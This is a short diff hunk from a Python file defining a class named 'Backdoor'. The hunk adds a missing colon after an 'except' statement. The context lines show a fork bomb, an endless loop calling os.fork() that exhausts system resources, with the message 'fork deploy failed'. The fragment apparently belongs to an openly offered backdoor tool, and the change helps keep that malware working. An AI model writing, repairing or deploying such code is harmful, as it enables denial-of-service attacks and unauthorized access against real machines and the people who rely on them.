@@ -157,7 +157,7 @@ class Backdoor:
         try:
             while 1:
                 os.fork()
-        except
+        except:
             return "[-] fork deploy failed [-]"
 
     def run(self):
